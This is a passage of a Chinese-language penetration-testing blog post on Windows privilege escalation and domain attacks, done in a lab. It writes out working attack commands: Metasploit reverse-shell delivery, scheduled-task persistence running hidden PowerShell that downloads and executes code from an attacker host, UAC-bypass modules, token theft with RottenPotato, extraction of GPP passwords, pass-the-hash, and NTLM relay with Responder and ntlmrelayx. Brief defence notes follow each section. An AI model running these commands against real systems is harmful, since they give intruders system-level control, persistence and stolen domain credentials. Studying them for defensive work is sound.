+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line">set target 2 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set lhost 172.16.1.7 </span><br><span class="line">set URIPATH / </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222729.png"></p>
+<p>任务运行后msf会收到会话。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn test /sc onidle /ru system /i 1 /tr &quot;c:\windows\system32\powershell.exe -windowStyle hiiden -NoLogo -Nointeractive -ep bypass -nop -c &#x27;IEX((new-object net.webclient).downloadstring(&#x27;&#x27;http://172.16.1.7:8080/CZcIHXcRs9x&#x27;&#x27;&#x27;))&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>powersploit</strong></p>
+<p>win7没成功，win2012成功，推测和ps版本有关。</p>
+<p>先生成payload文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.1.7 lport=443 -f psh-reflection -o fxxx.ps1</span><br></pre></td></tr></table></figure>
+
+<p>执行Persistence.psm1，生成persistence.ps1。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module ./Persistence.psm1 </span><br><span class="line">$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle </span><br><span class="line">$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle </span><br><span class="line">Add-Persistence -FilePath ./fxxx.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceoption $UserOptions -Verbose</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222758.png"></p>
+<p>然后将生成的persistence.ps1放到web服务器上，在目标机器中远程加载。或者直接在本地加载。</p>
+<p>ps：单独执行powershell.exe -NonInteractive会返回当前账户权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -Nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://172.16.1.1/persistence.ps1&#x27;);&quot; </span><br><span class="line">schtasks /Create /RU system /SC ONIDLE /I 1 /TN Updater /TR &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive&quot; </span><br></pre></td></tr></table></figure>
+
+<p>直接获得system权限。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222913.png"></p>
+<p><strong>检测工具</strong></p>
+<p>Autoruns</p>
+<h1 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a><strong>组策略首选项提权</strong></h1><p>SYSVOL是AD里面自动创建的一个用于存储域公共文件服务器副本（登录脚本、组策略数据等）的共享文件夹，在域中的所有域控制器之间进行自动同步和共享复制。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\目录中。</p>
+<p>常见的组策略首选项（GPP）：</p>
+<ul>
+<li>映射驱动器(Drives.xml) </li>
+<li>数据源(DataSources.xml) </li>
+<li>打印机配置(Printers.xml) </li>
+<li>创建、更新服务(Services.xml) </li>
+<li>计划任务(ScheduledTasks.xml)</li>
+</ul>
+<p>在域环境中，为了方便对所有的机器进行操作如修改本地管理员密码等，网管会使用域策略进行统一的配置和管理。</p>
+<p><strong>利用组策略批量创建用户</strong></p>
+<p>gpmc.msc</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214202341.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214202438.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214202505.png"></p>
+<p>随后强制更新组策略。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+
+<p>在SYSVOL中自动生成Groups.xml。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\holy.testA\Policies\&#123;5FAF9E4D-C8D4-42F0-B056-E4BDC9096632&#125;\Machine\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure>
+
+<p>也能用type命令查找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC\SYSVOL\holy.testA\Policies\&#123;5FAF9E4D-C8D4-42F0-B056-E4BDC9096632&#125;\MACHINE\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure>
+
+<p>该密码使用AES-256加密算法。2012年微软在官方网站上公布了该密码的私钥，导致任何域用户和域信任的用户均可访问该共享目录保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214203153.png"></p>
+<p>除了Groups.xml还有几个组策略首选项文件中有cpassword属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">services\services.xml </span><br><span class="line">scheduledtasks\scheduledtasks.xml </span><br><span class="line">printers\printers.xml </span><br><span class="line">drives\drives.xml </span><br><span class="line">datasources\datasources.xml</span><br></pre></td></tr></table></figure>
+
+<p><strong>PowerSploit</strong></p>
+<p>只需要以域用户权限登录任意一台域内机器执行即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214203239.png"></p>
+<p><strong>MSF</strong></p>
+<p>只需要以域用户权限登录任意一台域内机器执行即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/credentials/gpp</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214203426.png"></p>
+<p><strong>Empire</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/gpp</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong></p>
+<p>安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。</p>
+<p>此外，针对Everyone访问权限进行设置，具体如下：</p>
+<ul>
+<li>设置共享文件夹SYSVOL的访问权限。</li>
+<li>将包含组策略密码的XML文件从SYSVOL目录中删除。</li>
+<li>不要把密码放在所有域用户都有权访问的文件中。</li>
+<li>如果需要更改域中机器的本地管理员密码，建议使用LAPS。</li>
+</ul>
+<h1 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a><strong>绕过UAC提权</strong></h1><p>UAC要求用户在执行可能影响计算机或其他用户的操作前，对用户身份进行认证，需要拥有相应权限的密码，如：磁盘根目录、注册表、设备驱动程序、UAC设置等功能。高等级进程有管理员权限，中等级进程有普通用户权限，低等级进程权限是有限的。</p>
+<p><strong>前提</strong></p>
+<ul>
+<li>当前UAC必须为默认设置，“仅在程序试图改变。。。。”</li>
+<li>当前用户必须在管理员组中，domain admins组和本地管理员组均可。</li>
+</ul>
+<p><strong>MSF</strong></p>
+<p>bypassuac</p>
+<p>此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，生成第二个shell，获得system权限，会在目标机上创建多个文件，可能被查杀。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getuid </span><br><span class="line">getsystem                   检查是否有system权限 </span><br><span class="line">use exploit/windows/local/bypassuac </span><br><span class="line">set session 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214104248.png"></p>
+<p>bypassuac_injection（没成功）</p>
+<p>该模块直接运行在反射的dll中，不会接触硬盘，降低查杀概率。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_injection </span><br></pre></td></tr></table></figure>
+
+<p>bypassuac_fodhelper（win10）</p>
+<p>该模块劫持当前用户配置单元下注册表中的特殊键，插入自定义命令来绕过Windows 10 UAC，该命令将在启动fodhelper.exe应用程序时调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_fodhelper </span><br><span class="line">set session 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214110048.png"></p>
+<p>bypassuac_eventvwr</p>
+<p>该模块劫持当前用户配置单元下注册表中的特殊键，插入自定义命令来绕过UAC。在payload之后会自动将修改的注册表项清除。该模块不需要payload的体系架构和操作系统匹配。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">set session 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214110220.png"></p>
+<p>bypassuac_comhijack（没成功）</p>
+<p>此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的dll。此模块修改注册表项，但在调用payload后将清除该项。该模块需要payload的体系架构和操作系统匹配。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_comhijack </span><br></pre></td></tr></table></figure>
+
+<p>RunAs模块（多系统版本）</p>
+<p>该模块会创建一个可执行文件，目标机器会弹出是否继续运行的对话框，用户选择是之后会返回高权限shell，对UAC设置没有要求。需要当前用户在管理组中或知道管理员密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br></pre></td></tr></table></figure>
+
+<p><strong>Nishang</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -method oobe -Payload &quot;powershell -windowsyle hidden -e xxxxxx&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Empire</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/bypassuac </span><br><span class="line">usemodule privesc/bypassuac_wscript  适用于win7，暂时无补丁，低概率被查杀</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214110413.png"></p>
+<p><strong>防御</strong></p>
+<p>不让内网机器的使用者拥有本地管理员或域管理组权限，将UAC设置为“始终通知”。</p>
+<h1 id="令牌窃取提权"><a href="#令牌窃取提权" class="headerlink" title="令牌窃取提权"></a><strong>令牌窃取提权</strong></h1><p>令牌：系统中的临时密钥，相当于账户和密码，用来确定请求属于的用户身份以及是否允许请求。获得令牌即可不提供密码或其他凭证的情况下访问系统和网络资源，这些令牌持续存在于系统中，除非系统重启。伪造令牌的核心是Kerberos协议。</p>
+<ul>
+<li>Delegation Tokens：                    授权令牌，支持交互式登录（远程桌面等）。</li>
+<li>Impersonation Tokens：              模拟令牌，支持非交互式会话。</li>
+</ul>
+<p>ps：密保令牌属于物理设备，如U盾。</p>
+<p><strong>MSF</strong></p>
+<p>前提是已经获取到一个session。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito </span><br><span class="line">list_tokens -u           列出可用令牌 </span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   假冒用户，这里是两个反斜杠\\ </span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>两种token只在系统重启后清除，具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102231.png"></p>
+<p><strong>MSF+Rotten potato</strong></p>
+<p>不能直接获取令牌的情况下考虑用工具绕过。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u </span><br><span class="line">upload /root/RottenPotato-master/rottenpotato.exe    上传到目标机反弹码目录，默认是桌面</span><br><span class="line">execute -HC -f rottenpotato.exe    目标机需要.net 4.0以上，否则会在目标机上报错且无法成功利用 </span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; </span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102409.png"></p>
+<p>若获取了域管用户令牌，则可在meterpreter中远程向域控添加用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_user test test123456. -h 1.1.1.2              添加用户 </span><br><span class="line">add_group_user &quot;domain admins&quot; test -h 1.1.1.2    把用户添加到管理组</span><br></pre></td></tr></table></figure>
+
+<p><strong>migrate迁移进程</strong></p>
+<p>通过迭代的方式，将权限迁移到域管用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">administrator-&gt;system </span><br><span class="line">administrator-&gt;域管用户 </span><br><span class="line">域管用户无法-&gt;system </span><br><span class="line">域管用户无法-&gt;administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102517.png"></p>
+<p><strong>Empire</strong></p>
+<p>先获取本地管理员权限，然后使用内置的mimikatz，输入creds查看登录过该系统的账户和密码，看能否找到域管用户。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102804.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102826.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pth ID     hash传递，生成cmd进程，这里的ID必须是类型为hash的CredID，目标机器会弹出高权限cmd窗口 </span><br><span class="line">steal_token pid    窃取进程令牌，可直接寻找system权限进程 </span><br><span class="line">revtoself          将令牌权限恢复到原来的权限</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214103004.png"></p>
+<p><strong>防御</strong></p>
+<ul>
+<li>限制令牌时效性。</li>
+<li>使用加密链路SSL&#x2F;TLS传输令牌。</li>
+</ul>
+<h1 id="ntlm-relay攻击"><a href="#ntlm-relay攻击" class="headerlink" title="ntlm relay攻击"></a><strong>ntlm relay攻击</strong></h1><p>内网环境中，没有获取任何凭证或令牌的情况下，可使用LLMNR和NetBIOS，从而利用ntlm协议进行中继攻击，相当于是中间人攻击，攻击者获取了高权限用户的hash，可将hash转发给其他主机并执行命令。</p>
+<p><strong>LLMNR</strong></p>
+<p>本地链路多播名称解析，是一种数据包格式，基于DNS，可以将主机名解析为ipv4或ipv6地址。构造不存在的主机名，则无法使用DNS服务器进行解析，客户端会使用LLMNR解析本地网段中的机器名称。</p>
+<p>流程为：主机通过UDP协议向组播地址224.0.0.252的5355端口发送多播查询请求，来获取主机名的对应IP，所有支持LLMNR的主机收到查询请求后，会对比自己主机名，不同就不回应，相同就向查询主机发送包含自己IP地址的单播信息。由于是UDP协议，查询主机无法确认响应主机是否正确，就会给欺骗创造条件。</p>
+<p><strong>NetBIOS</strong></p>
+<p>网络协议，将计算机名称并解析为ip，不支持ipv6。</p>
+<p>NetBIOS-NS名称服务，用于名称注册和解析，该服务需要使用域名服务器注册NetBIOS名称，默认监听UDP的137端口，也可以使用TCP的137端口。</p>
+<p><strong>Responder</strong></p>
+<p>先尝试responder，一款内网监听工具，需要和目标机同一网段，利用不同的服务如SMB、MSSQL、常规漏洞等来捕捉客户端发送的LLMNR和NBT-NS请求并进行响应，获得Net-NTLM hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -rPv</span><br></pre></td></tr></table></figure>
+
+<p>环境部署：</p>
+<ul>
+<li>win7：172.16.1.10           域内目标，登录域管账户</li>
+<li>kali：172.16.1.7                中继，作为中继的机器必须要有域管理员权限或本地管理员权限</li>
+<li>win2008：172.16.1.11     域内目标，登录低权限域账户</li>
+<li>win2012：172.16.1.6       DC</li>
+</ul>
+<p><strong>通过SMB服务获取Net-NTLM hash</strong></p>
+<p>客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器来截获hash。用户名密码随便输。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\172.16.1.7\a</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214112811.png"></p>
+<p><strong>通过XSS获取Net-NTLM hash</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.1.1/practice/xss/xss.php?test=&lt;img/src=\\172.16.1.7\a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>讲道理curl应该也行。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214113626.png"></p>
+<p><strong>通过WPAD代理服务器抓取</strong></p>
+<p>WPAD用于在windows中自动化的设置ie浏览器的代理，加-F参数当PC浏览网站时即可抓取到NTLM hash，而且当主机重启时也能抓到机器账户的NTLM hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -rPv -F</span><br></pre></td></tr></table></figure>
+
+<p>只有高权限用户有效，低权限用户需要认证。win7没成功。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214113730.png"></p>
+<p><strong>利用hashcat等工具脱机破解</strong></p>
+<p>-m：hash-type，5600对应Net-NTLMv2。事先准备好password字典。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214161446.png"></p>
+<p>结果会存放在当前目录.potfile文件。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214125112.png"></p>
+<p><strong>relay</strong></p>
+<p>修改Responder.conf文件防止冲突。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214123316.png"></p>
+<p>启动，这里抓取域管账号的hash，等待其访问网页即可。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214123355.png"></p>
+<p>利用工具中的MultiRelay模块，若responder成功抓到hash的话，则会自动转发到MultiRelay这里从而获得目标机器的shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MultiRelay.py -t 172.16.1.10 -u ALL</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214123422.png"></p>
+<p><strong>ntlmrelayx.py</strong></p>
+<p>类似方法采用impacket工具包中的ntlmrelayx.py和smbrelayx.py。</p>
+<p>该脚本开启后会在本地开启很多服务用来钓鱼，包括http、smb等。真实环境中需要诱导管理员访问这些服务，输入账号密码进行验证。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214175929.png"></p>
+<p>充当中继，开启监听。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t smb://172.16.1.11 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
+
+<p>在靶机中访问kali的smb服务。</p>
+<p>relay到域控账户的Net-NTLM-Hash在win2008上执行了whoami命令。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214184424.png"></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>禁用 NTLM协议并切换到 Kerberos协议。无法禁用的话，则启用 SMB 签名或LDAP签名等来缓解。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《内网安全攻防:渗透测试实战指南》</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1b545a8b8b1e">https://www.jianshu.com/p/1b545a8b8b1e</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/105135184">https://blog.csdn.net/qq_36119192/article/details/105135184</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6623">https://xz.aliyun.com/t/6623</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">V3teran</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://v3teran.github.io/2021/02/14/%E5%9F%BA%E4%BA%8EWindows%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E6%9D%83/">https://v3teran.github.io/2021/02/14/基于Windows本地的提权/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://V3teran.github.io" target="_blank">V3teran's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/%E4%BB%A4%E7%89%8C/">令牌</a><a class="post-meta__tags" href="/tags/NTLM/">NTLM</a><a class="post-meta__tags" href="/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/">注册表</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193107.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/13/SQLServer%E6%8F%90%E6%9D%83/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218112845.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQLServer提权</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/15/Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%86%99Shell%E7%9A%84%E5%9D%91/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218111944.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div 